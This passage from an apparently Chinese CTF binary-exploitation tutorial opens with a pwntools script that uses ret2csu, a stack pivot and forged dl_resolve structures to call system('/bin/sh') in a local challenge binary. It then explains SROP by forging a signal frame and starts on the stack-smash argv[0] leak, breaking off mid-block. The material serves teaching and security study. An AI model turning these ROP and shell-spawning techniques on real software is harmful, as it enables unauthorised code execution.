class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;/bin/tmux&quot;,&quot;sp&quot;,&quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,49160 )</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class="line">io = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">rl = <span class="keyword">lambda</span>a=<span class="literal">False</span>: io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>: io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s: log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data: u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">ur64 = <span class="keyword">lambda</span> data: u64(data.rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r15) + p64(r14) + p64(r13) </span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x4007c0</span></span><br><span class="line">csu_end_addr = <span class="number">0x4007da</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007e3</span></span><br><span class="line">leave_ret = <span class="number">0x4005A3</span></span><br><span class="line">readgot = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dynamic = elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dyrelplt = elf.get_section_by_name(<span class="string">&#x27;.rela.dyn&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr_dyrelplt&#x27;</span>,<span class="built_in">hex</span>(addr_dyrelplt)</span><br><span class="line">addr_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dt_debug = addr_dynamic + <span class="number">0x10</span>*<span class="number">12</span></span><br><span class="line">addr_dt_pltgot = addr_dynamic + <span class="number">0x10</span>*<span class="number">13</span></span><br><span class="line">addr_dt_rela = addr_dynamic + <span class="number">0x10</span>*<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># useful gadgets</span></span><br><span class="line">findaddr = <span class="number">0x400606</span></span><br><span class="line">findaddrplt = bss_addr+<span class="number">0x40</span></span><br><span class="line">editaddr = <span class="number">0x000000000040067c</span></span><br><span class="line">editaddrplt = bss_addr+<span class="number">0x48</span></span><br><span class="line">resolver = bss_addr+<span class="number">0x10</span></span><br><span class="line">linkmap = bss_addr+<span class="number">18</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">size_bulkread = <span class="number">0x400</span></span><br><span class="line">offset = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, readgot, <span class="number">0</span>, base_stage, <span class="number">0x950</span>))</span><br><span class="line"><span class="comment"># stack pivot</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">linkmap: dt_debug(8) -&gt; r_debug(8) -&gt; r_map -&gt; linkmap</span></span><br><span class="line"><span class="string">resolver: linkmap-&gt;l_next(0x18) -&gt; l_next(0x18) -&gt; l_info[DT_PLTGOT](0x58) -&gt;d_un.d_ptr(got(0x8)) -&gt; resolver(0x10)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">addr_esp = base_stage + <span class="number">8</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, readgot, <span class="number">0</span>, bss_addr+<span class="number">0x20</span>, <span class="number">0x38</span>)) <span class="comment"># write dt_debug findaddr editaddr to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>,findaddrplt, <span class="number">0</span>, <span class="number">1</span>,<span class="number">0</span>)) <span class="comment"># write r_debug to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>,findaddrplt, <span class="number">8</span>, <span class="number">1</span>,<span class="number">0x8b0</span>/<span class="number">8</span>)) <span class="comment"># write r_map to bss (0x6018d8)</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x18</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x18</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_next to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x58</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT] to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x8</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x10</span>, <span class="number">0</span>,<span class="number">0x8b0</span>/<span class="number">8</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr-&gt;resolver to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, editaddrplt, <span class="number">0x8b0</span>/<span class="number">8</span>, <span class="number">0x1d0</span>/<span class="number">8</span>,<span class="number">0</span>)) <span class="comment"># write dt_versym</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, editaddrplt, <span class="number">0x8b0</span>/<span class="number">8</span>,<span class="number">0xf8</span>/<span class="number">8</span>,addr_dt_rela)) <span class="comment"># recover dt_JMPREL to rela.dyn bypass l_info[DT_JMPREL]=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># compute offset</span></span><br><span class="line">addr_esp += <span class="number">0x78</span>*<span class="number">10</span>+<span class="number">0x20</span></span><br><span class="line">fake_reloc = addr_esp + <span class="number">8</span></span><br><span class="line">align_reloc = <span class="number">0x18</span>-((fake_reloc-addr_dyrelplt)%<span class="number">0x18</span>)</span><br><span class="line">fake_reloc += align_reloc</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_reloc&#x27;</span>,<span class="built_in">hex</span>(fake_reloc)</span><br><span class="line"></span><br><span class="line">fakedynsym = fake_reloc + <span class="number">24</span></span><br><span class="line">align_dynsym = <span class="number">0x18</span>-((fakedynsym-addr_dynsym)%<span class="number">0x18</span>)</span><br><span class="line">fakedynsym += align_dynsym</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fakedynsym&#x27;</span>,<span class="built_in">hex</span>(fakedynsym)</span><br><span class="line"></span><br><span class="line">fakedynstr = fakedynsym + <span class="number">48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fakedynstr&#x27;</span>,<span class="built_in">hex</span>(fakedynstr)</span><br><span class="line">cmdstr = fakedynstr+<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;cmdstr&#x27;</span>,<span class="built_in">hex</span>(cmdstr)</span><br><span class="line"></span><br><span class="line">reloc_offset = (fake_reloc-addr_dyrelplt)/<span class="number">0x18</span></span><br><span class="line">r_info = (((fakedynsym-addr_dynsym)/<span class="number">0x18</span>)&lt;&lt;<span class="number">32</span>)|<span class="number">7</span></span><br><span class="line">st_name = fakedynstr - addr_dynstr</span><br><span class="line"></span><br><span class="line">rop.raw([pop_rdi_ret,cmdstr])</span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># dl_resolve</span></span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># linkmap</span></span><br><span class="line">rop.raw(reloc_offset) </span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) </span><br><span class="line">rop.raw(<span class="string">&#x27;A&#x27;</span>*align_reloc) </span><br><span class="line">rop.raw([bss_addr,r_info,<span class="number">0</span>]) <span class="comment"># keep fake reloc writeable </span></span><br><span class="line">rop.raw(<span class="string">&#x27;A&#x27;</span>*align_dynsym)</span><br><span class="line">rop.raw([st_name,<span class="number">0x12</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]) </span><br><span class="line">rop.raw(<span class="string">&#x27;system\x00\x00&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># print rop.dump()</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">pause()</span><br><span class="line">sl(rop.chain())</span><br><span class="line">pause()</span><br><span class="line">sl(p64(<span class="number">0xbeefdead</span>)+p64(<span class="number">0</span>)+p64(addr_dt_debug+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(findaddr)+p64(editaddr))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在partial|full relro时,更多时候目标就是依次伪造reloc表项,dynsym表项,dynstr表项,布置好参数,然后截取调用dlresolve(e.g.plt公共表项,ret直接调用等)</p><p>no relro时则方法要更多,但一般采用最方便的修改<code>.dynamic</code>中的索引指针</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt=""></p><ol><li><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p></li><li><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/signal2-stack.png" alt=""></p><p>从图中可以看出,<strong>执行完sigreturn,当前rsp指向的就是sigframe</strong></p><p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</p><ul><li>x86</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>x64</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p></li></ol><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><p>说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。</p><h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><p>首先，假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-1.png" alt=""></p><p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell</p><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。只需要做两处修改即可</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-2.png" alt=""></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul><p>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-gadget-1.png" alt=""></p><p>并且有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-gadget-2.png" alt="gadget1"></p><p>但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。</p><p>值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</p><h1 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，一般来说并不会关心报错信息。</p><p>而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串</p><p>argv[0]即函数名指针，正常情况下，这个指针指向了程序名。其代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>批注： 这个方法在 glibc-2.31 之后不可用了, 具体看这个部分代码 <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c">fortify_fail.c</a> 。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 